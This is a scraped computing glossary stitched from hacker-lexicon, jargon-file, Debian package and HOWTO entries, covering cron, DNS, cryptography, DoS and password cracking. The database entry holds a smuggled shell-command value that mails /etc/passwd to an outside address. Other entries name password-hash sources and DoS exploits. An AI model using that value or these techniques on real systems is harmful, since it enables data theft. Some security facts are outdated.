>&#13;In programming, a compiler takes human readable source code and converts it into the binary code that the computer can understand. Key point: A compiler is a form of lossy compression and one-way encryption. All the information meaningful to humans is removed from the code leaving only the information necessary for the computer. This means that humans can no longer easily read the resulting program directly. Because of the "one-way" nature of the operation, programs cannot be used to recover the existing source code. This effect is different in various languages. C++ is the worst language in terms of decompilation; Java is the best. Most Java applets can be decompiled back to some semblance of their previous form. This has led to a market for programs that further obfuscate Java binaries in an effort to hide the original source code. Some compilers do leave human-readable symbols behind for debugging purposes. They won't reveal the original source, but can still be useful for reverse engineering They can be "stripped" from the binary. From Hacking-Lexicon

><P
>&#13;A Perl replacement for Make Excerpted from the README file: Cons is a system for constructing, primarily, software, but is quite different from previous software construction systems. Cons was designed from the ground up to deal easily with the construction of software spread over multiple source directories. Cons makes it easy to create build scripts that are simple, understandable and maintainable. Cons ensures that complex software is easily and accurately reproducible. Cons uses a number of techniques to accomplish all of this. Construction scripts are just Perl scripts, making them both easy to comprehend and very flexible. Global scoping of variables is replaced with an import/export mechanism for sharing information between scripts, significantly improving the readability and maintainability of each script. Construction environments are introduced: these are Perl objects that capture the information required for controlling the build process. Multiple environments are used when different semantics are required for generating products in the build tree. Cons implements automatic dependency analysis and uses this to globally sequence the entire build. Variant builds are easily produced from a single source tree. Intelligent build subsetting is possible, when working on localized changes. Overrides can be setup to easily override build instructions without modifying any scripts. MD5 cryptographic signatures are associated with derived files, and are used to accurately determine whether a given file needs to be rebuilt. From Debian 3.0r0 APT

>&#13;A core file is created when a program terminates unexpectedly, due to a bug, or a violation of the operating systems or hardwares protection mechanisms. The operating system kills the program and creates a core file that programmers can use to figure out what went wrong. It contains a detailed description of the state that the program was in when it died. If would like to determine what program a core file came from, use the file command, like this: $ file core That will tell you the name of the program that produced the core dump. You may want to write the maintainer(s) of the program, telling them that their program dumped core. To Enable or Disable Core Dumps you must use the ulimit command in bash, the limit command in tcsh, or the rlimit command in ksh. See the appropriate manual page for details. This setting affects all programs run from the shell (directly or indirectly), not the whole system. If you wish to enable or disable core dumping for all processes by default, you can change the default setting in /usr/include/linux/sched.h. Refer to definition of INIT_TASK, and look also in /usr/include/linux/resource.h. PAM support optimizes the system's environment, including the amount of memory a user is allowed. In some distributions this parameter is configurable in the /etc/security/limits.conf file. From Linux Administrator's Security Guide.

When coping over a previous copy, the key features will allow coping only of new or non existing files in the backup.  This results in saving time and less load on the drive.  Built into the same feature of copying new files only, is a file removal procedure.  If a file is removed from the source path, the same file will be removed when the next backup is performed.  This provides a backup that is exactly the same as the source without filling up the drive.  As an added option, all files that will be overwritten or deleted when doing a copy over a previous backup, have the opportunity to be stored in a trash bin.  You can leave this trash bin to grow and grow just in case you need a backup of your backup.  When you start running out of disk space you will need to remove or clean up the trash bin.

>&#13;To decrypt a password, or to bypass a copy protection scheme. See crackz for more about copy protection. History: When the UNIX operating system was first developed, passwords were stored in the file /etc/passwd. This file was made readable by everyone, but the passwords were encrypted so that a user could not figure out who a person's password was. The passwords were encrypted in such a manner that you could test a password to see if it was valid, but you really couldn't decrypt the entry. (Note: not even administrators are able to figure out user's passwords; they can change them, but not decrypt them). However, a program called "crack" was developed that would simply test all the words in the dictionary against the passwords in /etc/passwd. This would find all user accounts whose passwords where chosen from the dictionary. Typical dictionaries also included people's names since a common practice is to choose a spouse's or child's name. Contrast: A "crack" program is one that takes existing encrypted passwords and attempts to find some that are "weak" and easily discovered. However, it is not a "password guessing" program that tries to login with many passwords, that is known as a grind Key point: The sources of encrypted passwords typically include the following: /etc/passwd from a UNIX system SAM or SAM._ from a Windows NT system &#60;username&#62;.pwl from a Windows 95/98 system sniffed challenge hashes from the network Key point: The "crack" program is a useful tool for system administrators. By running the program on their own systems, they can quickly find users who have chosen weak passwords. In other words, it is a policy enforcement tool. Tools: on UNIX, the most commonly used program is called simply "crack". On Windows, a popular program is called "l0phtCrack" from http://www.l0pht.com/. From Hacking-Lexicon

>&#13;On UNIX, the cron daemon automated background tasks (such as backups or rotating the logs). It is really the simplest of programs; it reads instructions from a file and executes the appropriate programs at the scheduled time. Key point: When the machine is compromised, intruders will often put backdoor jobs into the crontab. When the victim tries to clean up his/her machine, the jobs in the crontab will run giving the intruder control again. This sort of thing happened in the famous attack against the New York Times; they kept cleaning up the machine, but cron kept giving control back to the intruder. Typically, these jobs would run during the wee hours of the morning when nobody is looking. From Hacking-Lexicon

>&#13;management of regular background processing cron is a background process (`daemon') that runs programs at regular intervals (for example, every minute, day, week or month); which processes are run and at what times are specified in the `crontab'. Users may also install crontabs so that processes are run on their behalf, though this feature can be disabled or restricted to particular users. Output from the commands is usually mailed to the system administrator (or to the user in question); you should probably install a mail system as well so that you can receive these messages. This cron package is configured by default to do various standard system maintenance tasks, such as ensuring that logfiles do not grow endlessly and overflow the disk. The lockfile-progs package is only a "Suggests" because of the poor way that dselect handles "Recomments", but I do strongly suggest that you install it; it prevents /etc/cron.daily/standard from running multiple times if something gets jammed.

Even though these websites have a theoretical bandwidth of a gigabit/second, distributing many agents throughout the Internet flooding them with traffic can bring them down. Key point: The Internet is defenseless against these attacks. The best defense is for ISPs to do "egress filtering": prevent packets from going outbound that do not originate from IP addresses assigned to the ISP.

>&#13;/dek/ n. 1. v. Verbal (and only rarely written) shorthand for decrement, i.e. `decrease by one'. Especially used by assembly programmers, as many assembly languages have a dec mnemonic. Antonym: inc. 2. n. Commonly used abbreviation for Digital Equipment Corporation, later deprecated by DEC itself in favor of "Digital" and now entirely obsolete following the buyout by Compaq. Before the killer micro revolution of the late 1980s, hackerdom was closely symbiotic with DEC's pioneering timesharing machines. The first of the group of cultures described by this lexicon nucleated around the PDP-1 (see TMRC). Subsequently, the PDP-6, PDP-10, PDP-20, PDP-11 and VAX were all foci of large and important hackerdoms, and DEC machines long dominated the ARPANET and Internet machine population. DEC was the technological leader of the minicomputer era (roughly 1967 to 1987), but its failure to embrace microcomputers and Unix early cost it heavily in profits and prestige after silicon got cheap. Nevertheless, the microprocessor design tradition owes a major debt to the PDP-11 instruction set, and every one of the major general-purpose microcomputer OSs so far (CP/M, MS-DOS, Unix, OS/2, Windows NT) was either genetically descended from a DEC OS, or incubated on DEC hardware, or both. Accordingly, DEC was for many years still regarded with a certain wry affection even among many hackers too young to have grown up on DEC machines. DEC reclaimed some of its old reputation among techies in the first half of the 1990s. The success of the Alpha, an innovatively-designed and very high-performance killer micro, helped a lot. So did DEC's newfound receptiveness to Unix and open systems in general. When Compaq acquired DEC at the end of 1998 there was some concern that these gains would be lost along with the DEC nameplate, but the merged company has so far turned out to be culturally dominated by the ex-DEC side.

>&#13;In cryptography, DES (Data Encryption Standard) is the most popular algorithm for encrypting data. It is standardized by the United States government (ANSI X9.17) as well as the ISO. Key point: DES ushered in a new era of cryptography. Before DES, strong encryption was only available to large governments and militaries. Cryptography research was similarly limited. Anything that the average person might use could easily be cracked by a major government. DES created a well-defined, easily verifiable security architecture that was available to anyone. DES-capable products flooded the market. Beyond making encryption products available to anyone, DES essentially created the cryptographic community. Before DES researchers toiled away under government/big-business secrecy, After DES, cryptography became a normal computer-science subject. Whereas DES itself was developed by secretive government agencies (NSA) and mammoth corporations (IBM), DES's replacement will likely be created by relatively independent researchers and the cryptographic community as a whole. Contrast: As of the year 2000, DES has been supplanted by the newer AES. Because DES has only 56-bit keys, it can easily be cracked within hours. Contrast: An increasingly popular form of DES is Triple DES which increases the key strength to 112 bits.

>&#13;Analogy: When calling somebody via the telephone, you can lookup their name in the phone book in order to find the telephone number. DNS is a similar directory service. When contacting a web site, your browser looks up the name in DNS in order to find the IP number. History: DNS is relatively new. When the Internet was small, every machine simply had a list of all other machines on the Internet (stored in /etc/hosts). Generally, people just had the IP addresses of machines memorized in much the same way that people memorize phone numbers today. Key point: DNS is not needed for communication. If a DNS server goes down, newbies will think that the entire network is down. Hackers frequently deal with raw IP addresses, and indeed often bypass DNS entirely as it may give off signs of an attack. Key point: The DNS hierarchy starts from the "top level domains" of .com, .net, .org, .edu, .giv, .mil, and the two-letter country codes (e.g. .us for United States, .jp for Japan). Misunderstanding: Both IP addresses and domain names use dots: "www.robertgraham.com" vs. "192.0.2.133". This has no significance; the usage of these dots is unrelated. Trying to match things up one-to-one is wrong (i.e. ".com" == "192."). Analogy: What is your phone number? If I asked you this, you could give me both your home number and your cell phone number. I can reach you at either one. In much the same way, the a domain name like http://www.yahoo.com/ can have multiple IP addresses. Every time you visit that site, you might go to a separate IP address. You can test this out yourself. Go to the command-line and type "ping www.yahoo.com". Notice how it comes back with an IP address that it pings. After that runs, try it again. Notice how the second time it is pinging a different IP address. Details: DNS provides a number of resource records (RR): A ^ The normal record that contain an name to IP address mapping. LOC ^ The geographic location containing latitude, longitude, altitude, and size. Altitude is meters above sea level. Size is the exponent in the in meters of the volumetric size of the object. Hackers sometimes use these records to find where you are located physically. Humor: The original name of this record was ICBM. HOST ^ HOST records can contain information about the machine, such as if it is a Windows or UNIX machine. Administrators probably should not fill them in; they are dangerous. PTR.

>&#13;This system maps hostnames to IP numbers. DNS is the Domain Name System. DNS converts machine names to the IP addresses that all machines on the net have. It translates (or "maps" as the jargon would have it) from name to address and from address to name, and some other things. This HOWTO documents how to define such mappings using Unix system, with a few things specific to Linux. A mapping is simply an association between two things, in this case a machine name, like ftp.linux.org, and the machine's IP number (or address) 199.249.150.4. DNS also contains mappings the other way, from the IP number to the machine name; this is called a "reverse mapping". DNS is, to the uninitiated (you ;-), one of the more opaque areas of network administration. Fortunately DNS isn't really that hard. This HOWTO will try to make a few things clearer. It describes how to set up a simple DNS name server, starting with a caching only server and going on to setting up a primary DNS server for a domain. For more complex setups you can check the qanda section of this document. If it's not described there you will need to read the Real Documentation. I'll get back to what this Real Documentation consists of in the last chapter. Before you start on this you should configure your machine so that you can telnet in and out of it, and successfully make all kinds of connections to the net, and you should especially be able to do telnet 127.0.0.1 and get your own machine (test it now!). You also need good /etc/nsswitch.conf, /etc/resolv.conf and /etc/hosts files as a starting point, since I will not explain their function here. If you don't already have all this set up and working the Networking-HOWTO and/or the Networking-Overview-HOWTO explains how to set it up. Read them. When I say `your machine' I mean the machine you are trying to set up DNS on, not any other machine you might have that's involved in your networking effort. I assume you're not behind any kind of firewall that blocks name queries. If you are you will need a special configuration --- see the section on qanda. Name serving on Unix is done by a program called named. This is a part of the ``BIND'' package which is coordinated by The Internet Software Consortium. Named is included in most Linux distributions and is usually installed as /usr/sbin/named, usually from a package called BIND, in upper or lower case depending on the whim of the packager. If you have a named you can probably use it; if you don't have one you can get a binary off a Linux ftp site, or get the latest and greatest source from ftp://ftp.isc.org/isc/bind9/. This HOWTO is about BIND version 9. The old versions of the HOWTO, about BIND 4 and 8, is still available at http://langfeldt.net/DNS-HOWTO/ in case you use BIND 4 or 8 (incidentally, you will find this HOWTO there too). If the named man page talks about (at the very end, in the FILES section) named.conf you have BIND 8; if it talks about named.boot you have BIND 4. If you have 4 and are security conscious you really ought to upgrade to the latest version of BIND 8. Now. DNS is a net-wide database. Take care about what you put into it. If you put junk into it, you, and others, will get junk out of it. Keep your DNS tidy and consistent and you will get good service from it. Learn to use it, admin it, debug it and you will be another good admin keeping the net from falling to its knees by mismanagement. Tip: Make backup copies of all the files I instruct you to change if you already have them, so that if after going through this nothing works you can get it back to your old, working state.

This arrangement is called ADSL: Asymmetric Digital Subscriber Line. Another common configuration is symmetrical: 384 Kilobits per second in both directions. In theory ADSL allows download speeds of up to 9 megabits per second and upload speeds of up to 640 kilobits per second.

>&#13;The original public-key algorithm. Modern cryptography starts in 1976 when Diffie and Hellman published their groundbreaking paper "New Directions in Cryptography". Contrast: Whereas RSA is based upon the mathematical problem of factoring large numbers, DH is based upon the discrete logarithm problem. Whereas RSA can be used to encrypt messages, DH can only be used for key-exchange. However, RSA is essentially only used for key-exchange in the first place. The disadvantages of DH vs. RSA are: message expansion DH encrypted messages are larger (though this isn't really an issue for key-exchange). key size Current standards (e.g. DSS) specify smaller key sizes than those supported by RSA-based standards. CPU DH based standards take processing time than RSA based equivalents (and a lot more than than elliptical curve techniques). Advantages of DH over RSA are: patents This is no longer an important issue now that RSA patents have expired, but the reason DH became popular was because it was essentially patent-free. key generation It takes a long time to generate RSA keys, so DH is a better option if keys must be generated often. key size For keys of the same size, DH is more secure. In other words, it takes longer keys for RSA to be as secure as DH. security DH is conjectured to be less likely to be broken by new developements in mathematical theory. Contrast: The most common use of Diffie-Hellman is ElGamal, a public-key encryption variant of Diffie-Hellman. The U.S. government standard DSS is based upon ElGamal.

</B

><P
>&#13;An exploit whose purpose is to deny somebody the use of the service: namely to crash or hang a program or the entire system. Example: Some classes of DoS are: traffic flood Overwhelms the Internet connection. Because it is the Internet connection itself that is attacked, there isn't much the victim can do to stop the attack. A firewall might block the flood from going any further, but the Internet connection in front of the firewall is still overloaded. application floods or bombs Overwhelms a program with too many events. A firewall that allows the traffic cannot block these attacks. For example, a firewall configured to allow IRC cannot selectively block just the flood but allow all other traffic. Common services attacked this way are IRC, HTTP, and e-mail (SMTP). remote system crash/hang Historically, there have been a lot of ways of remotely crashing machines. These attack the TCP/IP stack within the system causing it to crash or hang. This affects all software running on the system. remote service crash Crashes just the application/service. This doesn't affect other software running on the system. Example: Some famous DoS attacks are: Ping of Death This exploit crashed most machines vintage 1995 by sending illegally fragmented packets at a victim. Even as late as 2000, some systems were vulnerable to variants of this DoS, such as the Jolt2 attack against Windows systems. SYN flood ping flood WinNuke Sending OOB/URG data across a TCP connection to Windows. teardrop Sends overlapping IP fragments at the victim. Overlapping IP fragments should normally never happen. This means that the code to handle them has never been tested -- and therefore many bugs exist. land (latierra) An attacker can forge a packet that is sent from the victim's machine to the victim's machine, which can cause it to reply back to itself in an infinite loop. targa A tool that includes many popular DoS attacks (by Mixter). Culture: A common word for DoS is "nuke", which was first popularized by the WinNuke program (a simple ping-of-death expoit script. These days, "nukes" are those DoS exploits that script kiddies in chat rooms use against each other. See also: SYN flood From Hacking-Lexicon

For example, the domain names: matisse.net mail.matisse.net workshop.matisse.net can all refer to the same machine, but each domain name can refer to no more than one machine. Usually, all of the machines on a given Network will have the same thing as the right-hand portion of their Domain Names (matisse.net in the examples above). It is also possible for a Domain Name to exist but not be connected to an actual machine. This is often done so that a group or business can have an Internet e-mail address without having to establish a real Internet site.

>&#13;/day'mn/ or /dee'mn/ n. [from the mythological meaning, later rationalized as the acronym `Disk And Execution MONitor'] A program that is not invoked explicitly, but lies dormant waiting for some condition(s) to occur. The idea is that the perpetrator of the condition need not be aware that a daemon is lurking (though often a program will commit an action only because it knows that it will implicitly invoke a daemon). For example, under ITS writing a file on the LPT spooler's directory would invoke the spooling daemon, which would then print the file. The advantage is that programs wanting (in this example) files printed need neither compete for access to nor understand any idiosyncrasies of the LPT. They simply enter their implicit requests and let the daemon decide what to do with them. Daemons are usually spawned automatically by the system, and may either live forever or be regenerated at intervals. Daemon and demon are often used interchangeably, but seem to have distinct connotations. The term `daemon' was introduced to computing by CTSS people (who pronounced it /dee'mon/) and used it to refer to what ITS called a dragon; the prototype was a program called DAEMON that automatically made tape backups of the file system. Although the meaning and the pronunciation have drifted, we think this glossary reflects current (2000) usage.  From Jargon Dictionary

>&#13;The database is one of the underpinning applications of the Internet. The concept of database "records" predates that of "files" within a computer. These days, most discussion of databases revolves around SQL (structured query language). An SQL statement is a special language that you may use to encode a statement such as show me everyone who has a first name of "Robert". The actual SQL statement would look like: "SELECT * from Everyone where firstname equals 'Robert'". Key point: The near-programming quality of SQL means that it is open to much the same security holes that plague other scripting languages. For example, a frequent attacks against databases is to insert shell metacharacters into data fields. For example, consider a reporting system using PERL that extracts data out of a database. I may create a bank acount where name is "| mail smc@robertgraham.com &#60; /etc/passwd", which will send me the password field when you run your month-end reports. In late 1999 and early year 2000, thousands of Microsoft's web servers were broken into because programs submitted command-line statements through SQL query statements through a default script left open on default installations of their servers.

>&#13;/dee-dee/ vt. [Unix: from IBM JCL] Equivalent to cat or BLT. Originally the name of a Unix copy command with special options suitable for block-oriented devices; it was often used in heavy-handed system maintenance, as in "Let's dd the root partition onto a tape, then use the boot PROM to load it back on to a new disk". The Unix dd(1) was designed with a weird, distinctly non-Unixy keyword option syntax reminiscent of IBM System/360 JCL (which had an elaborate DD `Dataset Definition' specification for I/O devices); though the command filled a need, the interface design was clearly a prank. The jargon usage is now very rare outside Unix sites and now nearly obsolete even there, as dd(1) has been deprecated for a long time (though it has no exact replacement). The term has been displaced by BLT or simple English `copy'.  From Jargon Dictionary

>&#13;n. 1. [techspeak] A situation wherein two or more processes are unable to proceed because each is waiting for one of the others to do something. A common example is a program communicating to a server, which may find itself waiting for output from the server before sending anything more to it, while the server is similarly waiting for more input from the controlling program before outputting anything. (It is reported that this particular flavor of deadlock is sometimes called a `starvation deadlock', though the term `starvation' is more properly used for situations where a program can never run simply because it never gets high enough priority. Another common flavor is `constipation', in which each process is trying to send stuff to the other but all buffers are full because nobody is reading anything.) See deadly embrace. 2. Also used of deadlock-like interactions between humans, as when two people meet in a narrow corridor, and each tries to be polite by moving aside to let the other pass, but they end up swaying from side to side without making any progress because they always move the same way at the same time.

>&#13;Debian Font Manager -- automatic font configuration framework. Defoma, which stands for DEbian FOnt MAnager, provides a framework of automatic font configuration. An application whose configuration of fonts requires users' hand can make the configuration process automated through Defoma, by installing a Defoma-configuration script to Defoma. The script gets called whenever a font is installed and removed, so that the script updates the configuration. Font packages should register their fonts to Defoma in order to have them configured automatically for applications. From Debian 3.0r0 APT

>&#13;ext2, minix and xiafs filesystem defragmenter As a file system is used, data tends to become more and more scattered across the disk, degrading performance.  A disk defragmenter simply re-organises the data on the disk, so that individual files occupy a single sequential set of disk blocks, and all the free space on the disk is collected together in a single region. Thie generally means that reading a whole file is faster, and disk accesses in general are more efficient. From Debian 3.0r0 APT

Degaussing is a destructive process. It generates a lot of heat which can physicaly damage the device, and it will remove the "low level" formatting that is shipped with the drive. Note that some SCSI hard-drives can be low-level formatted in the field. Best practice: Degauss all floppy disks and hard-drives before throwing them away. A lot of data from corporations have been recovered from defective disks that were thrown away. An equivalent for CD-ROMs is to put them in the microwave. See also: wipe. From Hacking-Lexicon

>&#13;n. 1. [techspeak] A quantitative change, especially a small or incremental one (this use is general in physics and engineering). "I just doubled the speed of my program!" "What was the delta on program size?" "About 30 percent." (He doubled the speed of his program, but increased its size by only 30 percent.) 2. [Unix] A diff, especially a diff stored under the set of version-control tools called SCCS (Source Code Control System) or RCS (Revision Control System). 3. n. A small quantity, but not as small as epsilon. The jargon usage of delta and epsilon stems from the traditional use of these letters in mathematics for very small numerical quantities, particularly in `epsilon-delta' proofs in limit theory (as in the differential calculus). The term delta is often used, once epsilon has been mentioned, to mean a quantity that is slightly bigger than epsilon but still very small. "The cost isn't epsilon, but it's delta" means that the cost isn't totally negligible, but it is nevertheless very small. Common constructions include `within delta of --', `within epsilon of --': that is, `close to' and `even closer to'. From Jargon Dictionary

"I've gotta give a demo of the drool-proof interface; how does it work again?" 3. n. Esp. as `demo version', can refer either to an early, barely-functional version of a program which can be used for demonstration purposes as long as the operator uses exactly the right commands and skirts its numerous bugs, deficiencies, and unimplemented portions, or to a special version of a program (frequently with some features crippled) which is distributed at little or no cost to the user for enticement purposes. 4. [demoscene] A sequence of demoeffects (usually) combined with self-composed music and hand-drawn ("pixelated") graphics. These days (1997) usually built to attend a compo.

>&#13;n. 1. [MIT] A portion of a program that is not invoked explicitly, but that lies dormant waiting for some condition(s) to occur. See daemon. The distinction is that demons are usually processes within a program, while daemons are usually programs running on an operating system. 2. [outside MIT] Often used equivalently to daemon -- especially in the Unix world, where the latter spelling and pronunciation is considered mildly archaic. Demons in sense 1 are particularly common in AI programs. For example, a knowledge-manipulation program might implement inference rules as demons. Whenever a new piece of knowledge was added, various demons would activate (which demons depends on the particular piece of data) and would create additional pieces of knowledge by applying their respective inference rules to the original piece. These new pieces could in turn activate more demons as the inferences filtered down through chains of logic. Meanwhile, the main program could continue with whatever its primary task was.

>&#13;dial on demand daemon for PPP and SLIP. Many sites use SLIP or PPP links to connect to other sites over phone lines. Normally these links must be explicitly turned on or off. diald can be used to bring a SLIP or PPP link up when there are Internet packets to be sent to another site, and to close the link down when it is idle. diald operates by starting a virtual link on a pseudo tty and setting up a route to the resulting interface. This interface is called the proxy.  diald monitors the proxy to determine when to bring up a real communications link.  When a real link is up diald routes packets from the proxy to the real link and monitors the real link to decide if it needs to be shut down.  As well, if the link goes down unexpectedly diald will attempt to reestablish the link.  The rules for controlling these operations are extensively configurable in run time startup files. Diald requires that you use either the ethertap interface (available in recent Linux kernels) or SLIP to provide the proxy interface. Thus, one or the other of these interfaces is required for diald to work. Diald needs a program like "chat" or "expect" to actually dial. Sorry, "dip" cannot be used. From Debian 3.0r0 APT

Such dictionaries not only contain real words, but words that people choose for passwords (example: NCC1701, which is the serial number for the starship Enterprise in Star Trek). Key point: It takes only a couple minutes to run through hundreds of thousands of words in a dictionary in order to crack a password. Therefore, never choose a word that may be in a dictionary. Key point: The dictionary files that hackers use are not necessarily the same as English dictionaries. In theory, users will choose the same passwords they have used before, and unrelated users will choose the same passwords. Therefore, lists of passwords users chose in the past forms a key component of hacker dictionaries. Key point: Hackers also run non-English dictionaries, so choosing foreign words isn't a good defense. From Hacking-Lexicon

It does NOT require a sound card, as it can use the built-in speaker to play these melodies just as easily. (Note: in order for the built-in speaker to be used, ditty's stdout must be connected to a tty.  Certain terminal emulators, such as xterm, don't support the sound controls.  If you aren't using the sound card method, you should generally run ditty from a *real* pseudo-terminal).

It accepts iterative DNS queries from hosts around the Internet asking about various IP addresses.  It provides responses showing whether the addresses are on a locally configured list, such as RBL or DUL. axfrdns is a DNS zone-transfer server. It reads a zone-transfer request in DNS-over-TCP format from its standard input, and responds with locally configured information. The security of this software is guaranteed by the author.

>&#13;A DTMF Tone Dialer dtmfdial is a DTMF (Dual Tone Multiple Frequency) tone generator. This program generates the same tones that modern "TouchTone" telephones use to dial. This program could actually be used to dial a phone on any phone system which supports DTMF tones. DTMF dial requires a sound card to work, and is designed to be used as a phone dialer from address book programs. From Debian 3.0r0 APT

>&#13;A system having more than one network connection. An example could be a private network within your home, where one system also has a dial-up line. Contrast: The word dual-homed could refer to a router, but is usually used to clarify that the system has multiple network connection, but it NOT supposed to provide briding/routing/interconnection services between them. Dual-home systems are a prime target of hackers because when they are subverted, they provide a prime way to compromise networks. Examples: elliptic curves (ANSI x962, IEEE P1363)[5] Elliptic curves have been found useful for public key cryptography. Contrast: An elliptic curve key of roughly 160-bits is equivalent in security to a RSA or DH key of 1024-bits. Elliptic curve systems are dramatically faster than RSA or DH, which makes them useful in smart-card applications that have anemic CPUs. Certicom (the owner of many elliptic curve patents) recommends a public-key size of roughly twice the size of the symmetric-key to provide equivalent security. Point: While elliptic curves have many advantages (size, speed) over other techniques, they are a lot newer and therefore not trusted. From Hacking-Lexicon

Today, IBM claims to be an open-systems company, but IBM's own description of the EBCDIC variants and how to convert between them is still internally classified top-secret, burn-before-reading.

>&#13;/ee'maks/ n. [from Editing MACroS] The ne plus ultra of hacker editors, a programmable text editor with an entire LISP system inside it. It was originally written by Richard Stallman in TECO under ITS at the MIT AI lab; AI Memo 554 described it as "an advanced, self-documenting, customizable, extensible real-time display editor". It has since been reimplemented any number of times, by various hackers, and versions exist that run under most major operating systems. Perhaps the most widely used version, also written by Stallman and now called "GNU EMACS" or GNUMACS, runs principally under Unix. (Its close relative XEmacs is the second most popular version.) It includes facilities to run compilation subprocesses and send and receive mail or news; many hackers spend up to 80% of their tube time inside it. Other variants include GOSMACS, CCA EMACS, UniPress EMACS, Montgomery EMACS, jove, epsilon, and MicroEMACS. (Though we use the original all-caps spelling here, it is nowadays very commonly `Emacs'.) Some EMACS versions running under window managers iconify as an overflowing kitchen sink, perhaps to suggest the one feature the editor does not (yet) include. Indeed, some hackers find EMACS too heavyweight and baroque for their taste, and expand the name as `Escape Meta Alt Control Shift' to spoof its heavy reliance on keystrokes decorated with bucky bits. Other spoof expansions include `Eight Megabytes And Constantly Swapping' (from when that was a lot of core), `Eventually malloc()s All Computer Storage', and `EMACS Makes A Computer Slow' (see recursive acronym).

A second drawback is that most application programs, you cannot view the image on-screen unless you attach a screen image to it.

>&#13;Emacs is different things to different people. Depending who you ask, you'll could get any of the following responses: Text Editor, Mail Client, News Reader, Word Processor, Religion, Integrated Development Environment, Whatever you want it to be!, But for our purposes, let's just pretend it's a text editor--an amazingly flexible text editor. We'll dig deeper into the question later on. Emacs was written by Richard Stallman (founder of the Free Software Foundation: http://www.fsf.org/ and the GNU project http://www.gnu.org/) and he still maintains it today. Emacs is one of the most popular and powerful text editors used on Linux (and Unix). It is second in popularity only to vi. It is known for it huge feature set, ability to be easily customized, and lack of bugs. It's large feature set and ability to be customized actually are the result of how Emacs was designed and implemented. Without going into all the details, I'll simply point out that Emacs isn't ``just an editor''. It is an editor written mostly in the programming language Lisp. At the core of Emacs is a full-featured Lisp interpreter written in C. Only the most basic and low-level pieces of Emacs are written in C. The majority of the editor is actually written in Lisp. So, in a sense, Emacs has an entire programming language ``built in'' which you can use to customize, extend, and change its behavior. Emacs is also one of the oldest editors around. The fact that is has been used by thousands of programmers over the past 20 (?) years means that there are many add-on packages available. These add-ons allow you to make Emacs do things that Stallman had probably never dreamed possible when he first began work on Emacs. More on that in a later section. There are many other web sites and documents which give a better overview of Emacs, its history, and related matters. Rather than attempt to reproduce much of that here, I suggest that you check out some of the places listed in Section Other Resources section of this document. From EMACs-HOWTO

>&#13;Contrast: Encoding is not encryption. A lot of passwords are sent across the wire encoded (such as HTTP's BASE64 encoded passwords). In essence, they are still clear-text passwords; most password sniffers will still read them from the wire. Example: The main issue with encoding is how to get binary data sent within a text message. For full binary data, this results in about 40% "expansion" of the file size (i.e. when you e-mail 1-megabyte of data to a fried, this encoding will result in about a 1.4-megabyte message size). BASE64 aka. RADIX64. Content-Transfer-Encoding: Base64 The preferred encoding method these days for MIME e-mail messages and virtually everywhere else. uuencode and uudecode UNIX-to-UNIX While having been largely replaced with BASE64 encoding, uuencoding is the granddady of encoding methods. It increases the file size roughly 42%. It was originally developed for e-mail encoding. Few e-mail programs generate this encoding, but most all of them can decode it. The main reason for its disfavor is that a lot of programs are slightly inconsistent in the way that they encode/decode data using this technique, subtly corrupting files. See also: uucp. quoted printable Content-Transfer-Encoding: quoted-printable This consists of normal ASCII text, where any binary character (or other problematic character such as a space at the end of the line) is converted to a 3-character code consisting of the equals sign followed by two hex digits representing the binary value. For example, the code =20 indicates a single character with the hex value of 0x20, which is equal to decimal 32. In ASCII, this is a space. E-mail messages are often automatically line-wrapped for long lines. The line is frequently wrapped after a space between two words, resulting in a space at the end of a line. Therefore, you will sometimes see e-mail messages with a lot of lines ending in =20 due to the requirements of this encoding method to encoding trailing spaces. This encoding is most often used for European text (especially French) which has occasional accented characters in what is otherwise largely ASCII text. BinHex. A standard Macintosh encoding method; rarely used elsewhere. Key point: E-mail clients typical support more encoding methods than content scanners (aka. anti-virus scanners). Therefore, by encoding your e-mail correctly, you can often bypass these. Key point: A big problem in the security industry is the presences of redunant encoding methods Microsoft's web servers were hacked because of redundant ways of encoding UNICODE characters.

>&#13;encryption (encrypt, encipher)
</B
></DT

><P
>&#13;Encryption is a way of mangling data so that an unauthorized party cannot understand it. Encryption applies mathematical operations to data in order to render it incomprehensible. The only way to read the data is apply the reverse mathematical operations. In technical speak, encryption is applies mathematical algorithms with a key that converts plaintext to ciphertext. Only someone in possession of the key can decrypt the message. Analogy: Some aliens come down to earth and give you a safe, and a key to the lock. For purposes of this discussion, the aliens use some magic technology that is beyond our human understanding, and that we will never be able to break into the safe. You steal something, put it into the safe, and lock it up with the key. You hide the key. The police arrest you and confiscate the safe. The only way the police will ever recover this stolen object is when you give them the key. Encryption is the same way; it creates an unbreakable box that you can put data in that nobody can ever get back out unless they have the appropriate key. Controversy: Encryption has massive philosophical implications when put into widespread use. It means that citizens can hide their data from governments (especially repressive ones) and law enforcement (especially when you are committing a crime). This has the potential of making governments more accountable to the populace. It likewise has the potential of making crime easier. Key point: Encryption tends to be the strongest link in the chain. When encryption is cracked, it is usually through some other weakness like key distribution or weak passwords. Contrast: Asymmetric encryption uses different keys for encryption and decryption. Since the most useful form of this is one you keep one key private and make the other public, this is better known as public key encryption. In contrast, symmetric encryption uses the same key for both encryption and decryption. Notes: Some algorithms popular in cryptography are: DES, rc4 Some popular applications that use encryption are: PGP, web browsers. Some protocols that use encryption are: SSL, IPsec From Hacking-Lexicon

>&#13;The Enlightenment Window Manager Enlightenment - the window manager that dares to do what others don't. It features KDE and GNOME integration, multi-program sound support, iconification, sliding desktops, docking, epplets, Xinerama support and much more. Enlightenment takes the concepts of themes to another level - everything can be changed. The visual components of themes are a rich set of graphical images in a variety of formats. Theme makers can unleash their artistic talents without bounds. Themes are not limited to just different colors and background images on the same old desktop. Enlightenment features the BrushedMetal theme, designed by gimp legend, tigert. It is predominately grey with the subtle texture of - you guessed it - brushed metal.  The menus in particular look superb. The sound files for BrushedMetal are in a separate package, enlightenment-theme-brushedmetal. From Debian 3.0r0 APT

Another possibility is creation of a meta package. When this package contains a dependency as "Depends: a, b, c", then installing this package will also select packages a, b and c. Instead of "Depends", you can also use "Recommends:" or "Suggests:" for less demanding dependency.

>&#13;In general, escrow means to hold something aside in case of eventualities. Analogy: For example, one company provide software that another company sells imbedded in their hardware. The second company (the OEM) is scared that the first company may go out of business, so requests that the first company put the source code for the software in escrow. Should the first company go out of business, the second company would still be able to sell their product. Key point: Law enforcement is constantly pushing for key escrow where a third party holds back-door keys to all encryption products. Law enforcement would then be able to obtain these keys with a court order into order to decrypt messages or eavesdrop on communications.

